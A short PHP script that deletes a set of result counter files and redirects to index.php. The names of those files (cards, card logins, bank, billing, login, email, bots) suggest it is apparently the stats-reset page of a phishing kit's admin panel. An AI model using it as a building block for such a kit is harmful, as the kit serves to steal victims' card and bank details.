<?php
error_reporting(0);
session_start();
include'session.php';
unlink("../result/total_click.txt");
unlink("../result/total_bot.txt");
unlink("../result/total_email.txt");
unlink("../result/total_cc.txt");
unlink("../result/total_cclogin.txt");
unlink("../result/total_login.txt");
unlink("../result/total_upload.txt");
unlink("../result/total_billing.txt");
unlink("../result/total_bank.txt");
echo "<script type='text/javascript'>
window.top.location='index.php';
</script>";